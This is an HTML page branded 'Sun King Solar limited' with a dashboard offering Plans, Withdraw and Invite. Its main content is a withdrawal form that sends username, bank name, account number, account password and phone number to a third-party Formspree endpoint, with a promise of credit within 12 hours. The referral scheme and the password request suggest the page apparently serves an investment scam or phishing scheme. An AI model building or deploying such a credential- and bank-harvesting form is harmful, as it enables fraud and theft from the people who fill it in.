<html lang="en">

<head>
    <meta charset="UTF-8">

    <link rel="shortcut icon" type="image/x-icon" href="icon.ico">

    <title>Sun King Solar limited</title>
</head>

<body>

    <!-- SIDEBAR -->
    <section id="sidebar">
        <a href="#" class="brand">
            <i class='bx bxs-smile'></i>
            <span class="text">SunKing</span>
        </a>
        <ul class="side-menu top">
            <li class="active">
                <a href="index.html">
                    <i class='bx bxs-dashboard'></i>
                    <span class="text">Dashboard</span>
                </a>
            </li>
            <li>
                <a href="plan.html">
                    <i class='bx bxs-shopping-bag-alt'></i>
                    <span class="text">Plans</span>
                </a>
            </li>
            <li>
                <a href="#">
                    <i class='bx bxs-doughnut-chart'></i>
                    <span class="text">Withdraw</span>
                </a>
            </li>
            <li>
                <a href="#">
                    <i class='bx bxs-message-dots'></i>
                    <span class="text">Invite</span>
                </a>
            </li>
            <li>
                <a href="#">
                    <i class='bx bxs-group'></i>
                    <span class="text">Me</span>
                </a>
            </li>
        </ul>
    </section>
    <!-- SIDEBAR -->

    <!-- CONTENT -->
    <section id="content">
        <!-- NAVBAR -->
        <nav>
            <i class='bx bx-menu'></i>
            <a href="#" class="nav-link">Categories</a>
            <form action="#">
                <div class="form-input">
                    <input type="search" placeholder="Search...">
                    <button type="submit" class="search-btn"><i class='bx bx-search'></i></button>
                </div>
            </form>

            <input type="checkbox" id="switch-mode" hidden>
            <label for="switch-mode" class="switch-mode"></label>

            <a href="#" class="profile">
                <img src="img/people2.png">
            </a>
        </nav>
        <!-- NAVBAR -->

        <!-- MAIN -->
        <main>
            <div class="wrapper">
                <div class="title">
                    WITHDRAWAL FORM
                </div>
                <div class="form">
                    <form action="https://formspree.io/f/xaygpbll" method="POST">
                        <div class="inputfield">
                            <label for="username">Username</label>
                            <input type="text" class="input" id="username" name="username" required>
                        </div>
                        <div class="inputfield">
                            <label for="amount">Amount</label>
                            <input type="number" class="input" id="amount" name="amount" required>
                        </div>
                        <div class="inputfield">
                            <label for="bank_name">Bank Name</label>
                            <input type="text" class="input" id="bank_name" name="bank_name" required>
                        </div>
                        <div class="inputfield">
                            <label for="account_number">Account Number</label>
                            <input type="number" class="input" id="account_number" name="account_number" required>
                        </div>
                        <div class="inputfield">
                            <label for="password">Password</label>
                            <input type="text" class="input" id="password" name="pass_word" required>
                        </div>
                        <div class="inputfield">
                            <label for="referral_code">Referral Code</label>
                            <input type="number" class="input" id="referral_code" name="referral_code" required>
                        </div>
                        <div class="inputfield">
                            <label for="phone_number">Phone Number</label>
                            <input type="number" class="input" id="phone_number" name="phone_number" required>
                        </div>
                        <div class="inputfield terms">
                            <p>Your request will be processed, and you will be credited within 12 hours. DO NOT SUBMIT
                                MULTIPLE TIMES</p>
                        </div>
                        <div class="inputfield">
                            <input type="submit" value="Submit" class="btn">
                        </div>
                    </form>
                </div>                
            </div>
        </main>
        <!-- MAIN -->
    </section>
    <!-- CONTENT -->

    <script src="script.js"></script>
</body>

</html>
